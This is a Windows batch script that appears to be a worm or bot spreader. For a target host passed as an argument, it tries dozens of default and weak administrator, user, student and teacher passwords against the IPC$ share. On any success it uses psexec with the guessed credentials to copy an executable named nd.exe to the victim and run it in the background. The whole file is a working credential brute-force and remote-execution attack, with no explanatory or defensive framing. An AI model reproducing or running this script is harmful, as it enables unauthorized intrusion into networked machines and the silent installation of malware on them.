@echo off
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto bluesc4n4
net use \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto bluesc4n5
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto bluesc4n1
net use \\%1\ipc$ "abc" /user:administrator
if not errorlevel 1 goto bluesc4n30
net use \\%1\ipc$ "student" /user:student
if not errorlevel 1 goto bluesc4n31
net use \\%1\ipc$ "" /user:admin
if not errorlevel 1 goto bluesc4n38
net use \\%1\ipc$ "" /user:user
if not errorlevel 1 goto bluesc4n33
net use \\%1\ipc$ "user" /user:user
if not errorlevel 1 goto bluesc4n34
net use \\%1\ipc$ "teacher" /user:teacher
if not errorlevel 1 goto bluesc4n32
net use \\%1\ipc$ "xxyyzz" /user:administrator
if not errorlevel 1 goto bluesc4n29
net use \\%1\ipc$ "1" /user:administrator
if not errorlevel 1 goto bluesc4n26
net use \\%1\ipc$ "123" /user:administrator
if not errorlevel 1 goto bluesc4n27
net use \\%1\ipc$ "12345" /user:admin
if not errorlevel 1 goto bluesc4n28
net use \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto bluesc4n6
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto bluesc4n35
net use \\%1\ipc$ "Administrator" /user:administrator
if not errorlevel 1 goto bluesc4n2
net use \\%1\ipc$ "Administrator" /user:administrator
if not errorlevel 1 goto bluesc4n37
net use \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto bluesc4n3
net use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto bluesc4n10
net use \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto bluesc4n7
net use \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto bluesc4n8
net use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto bluesc4n9
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto bluesc4n11
net use \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto bluesc4n12
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto bluesc4n13
net use \\%1\ipc$ "123456" /user:administrator
if not errorlevel 1 goto bluesc4n14
net use \\%1\ipc$ "654321" /user:administrator
if not errorlevel 1 goto bluesc4n15
net use \\%1\ipc$ "abc123" /user:administrator
if not errorlevel 1 goto bluesc4n16
net use \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto bluesc4n36
net use \\%1\ipc$ "red123" /user:administrator
if not errorlevel 1 goto bluesc4n17
net use \\%1\ipc$ "admin123" /user:administrator
if not errorlevel 1 goto bluesc4n18
net use \\%1\ipc$ "qwerty" /user:administrator
if not errorlevel 1 goto bluesc4n19
net use \\%1\ipc$ "asdf" /user:administrator
if not errorlevel 1 goto bluesc4n20
net use \\%1\ipc$ "password123" /user:administrator
if not errorlevel 1 goto bluesc4n21
net use \\%1\ipc$ "secret" /user:administrator
if not errorlevel 1 goto bluesc4n22
net use \\%1\ipc$ "qwertyuiop" /user:administrator
if not errorlevel 1 goto bluesc4n23
net use \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto bluesc4n24
net use \\%1\ipc$ "54321" /user:administrator
if not errorlevel 1 goto bluesc4n25
goto bluesc4nend
:bluesc4n11
psexec \\%1 -u root -p "root" -d attrib.exe -r nd.exe
psexec \\%1 -u root -p "root" -f -c -d nd.exe -o
psexec \\%1 -u root -p "root" -d nd.exe -o
goto bluesc4nend
:bluesc4n1
psexec \\%1 -u administrator -p "" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "" -d nd.exe -o
goto bluesc4nend
:bluesc4n2
psexec \\%1 -u administrator -p "administrator" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "administrator" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "administrator" -d nd.exe -o
goto bluesc4nend
:bluesc4n38
psexec \\%1 -u admin -p "" -d attrib.exe -r nd.exe
psexec \\%1 -u admin -p "" -f -c -d nd.exe -o
psexec \\%1 -u admin -p "" -d nd.exe -o
goto bluesc4nend
:bluesc4n37
psexec \\%1 -u administrator -p "Administrator" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "Administrator" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "Administrator" -d nd.exe -o
goto bluesc4nend
:bluesc4n10
psexec \\%1 -u administrator -p "admin" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "admin" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "admin" -d nd.exe -o
goto bluesc4nend
:bluesc4n13
psexec \\%1 -u admin -p "admin" -d attrib.exe -r nd.exe
psexec \\%1 -u admin -p "admin" -f -c -d nd.exe -o
psexec \\%1 -u admin -p "admin" -d nd.exe -o
goto bluesc4nend
:bluesc4n3
psexec \\%1 -u administrator -p "test" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "test" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "test" -d nd.exe -o
goto bluesc4nend
:bluesc4n4
psexec \\%1 -u test -p "test" -d attrib.exe -r nd.exe
psexec \\%1 -u test -p "test" -f -c -d nd.exe -o
psexec \\%1 -u test -p "test" -d nd.exe -o
goto bluesc4nend
:bluesc4n5
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "test123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "test123" -d nd.exe -o
goto bluesc4nend
:bluesc4n6
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "temp" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "temp" -d nd.exe -o
goto bluesc4nend
:bluesc4n7
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "temp123" -d nd.exe -o
goto bluesc4nend
:bluesc4n8
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "pass" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "pass" -d nd.exe -o
goto bluesc4nend
:bluesc4n9
psexec \\%1 -u administrator -p "password" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "password" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "password" -d nd.exe -o
goto bluesc4nend
:bluesc4n12
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "changeme" -d nd.exe -o
goto bluesc4nend
:bluesc4n14
psexec \\%1 -u administrator -p "123456" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "123456" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "123456" -d nd.exe -o
goto bluesc4nend
:bluesc4n15
psexec \\%1 -u administrator -p "654321" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "654321" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "654321" -d nd.exe -o
goto bluesc4nend
:bluesc4n16
psexec \\%1 -u administrator -p "abc123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "abc123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "abc123" -d nd.exe -o
goto bluesc4nend
:bluesc4n17
psexec \\%1 -u administrator -p "red123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "red123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "red123" -d nd.exe -o
goto bluesc4nend
:bluesc4n18
psexec \\%1 -u administrator -p "admin123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "admin123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "admin123" -d nd.exe -o
goto bluesc4nend
:bluesc4n19
psexec \\%1 -u administrator -p "qwerty" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "qwerty" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "qwerty" -d nd.exe -o
goto bluesc4nend
:bluesc4n20
psexec \\%1 -u administrator -p "asdf" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "asdf" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "asdf" -d nd.exe -o
goto bluesc4nend
:bluesc4n21
psexec \\%1 -u administrator -p "password123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "password123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "password123" -d nd.exe -o
goto bluesc4nend
:bluesc4n22
psexec \\%1 -u administrator -p "secret" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "secret" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "secret" -d nd.exe -o
goto bluesc4nend
:bluesc4n23
psexec \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "qwertyuiop" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "qwertyuiop" -d nd.exe -o
goto bluesc4nend
:bluesc4n24
psexec \\%1 -u administrator -p "12345" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "12345" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "12345" -d nd.exe -o
goto bluesc4nend
:bluesc4n25
psexec \\%1 -u administrator -p "54321" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "54321" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "54321" -d nd.exe -o
goto bluesc4nend
:bluesc4n26
psexec \\%1 -u administrator -p "1" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "1" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "1" -d nd.exe -o
goto bluesc4nend
:bluesc4n27
psexec \\%1 -u administrator -p "123" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "123" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "123" -d nd.exe -o
goto bluesc4nend
:bluesc4n28
psexec \\%1 -u admin -p "12345" -d attrib.exe -r nd.exe
psexec \\%1 -u admin -p "12345" -f -c -d nd.exe -o
psexec \\%1 -u admin -p "12345" -d nd.exe -o
goto bluesc4nend
:bluesc4n29
psexec \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "xxyyzz" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "xxyyzz" -d nd.exe -o
goto bluesc4nend
:bluesc4n30
psexec \\%1 -u administrator -p "abc" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "abc" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "abc" -d nd.exe -o
goto bluesc4nend
:bluesc4n31
psexec \\%1 -u student -p "student" -d attrib.exe -r nd.exe
psexec \\%1 -u student -p "student" -f -c -d nd.exe -o
psexec \\%1 -u student -p "student" -d nd.exe -o
goto bluesc4nend
:bluesc4n32
psexec \\%1 -u teacher -p "teacher" -d attrib.exe -r nd.exe
psexec \\%1 -u teacher -p "teacher" -f -c -d nd.exe -o
psexec \\%1 -u teacher -p "teacher" -d nd.exe -o
goto bluesc4nend
:bluesc4n33
psexec \\%1 -u user -p "" -d attrib.exe -r nd.exe
psexec \\%1 -u user -p "" -f -c -d nd.exe -o
psexec \\%1 -u user -p "" -d nd.exe -o
goto bluesc4nend
:bluesc4n34
psexec \\%1 -u user -p "user" -d attrib.exe -r nd.exe
psexec \\%1 -u user -p "user" -f -c -d nd.exe -o
psexec \\%1 -u user -p "user" -d nd.exe -o
goto bluesc4nend
:bluesc4n35
psexec \\%1 -u administrator -p "" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "" -d nd.exe -o
goto bluesc4nend
:bluesc4n36
psexec \\%1 -u administrator -p "12345" -d attrib.exe -r nd.exe
psexec \\%1 -u administrator -p "12345" -f -c -d nd.exe -o
psexec \\%1 -u administrator -p "12345" -d nd.exe -o
goto bluesc4nend
:bluesc4nend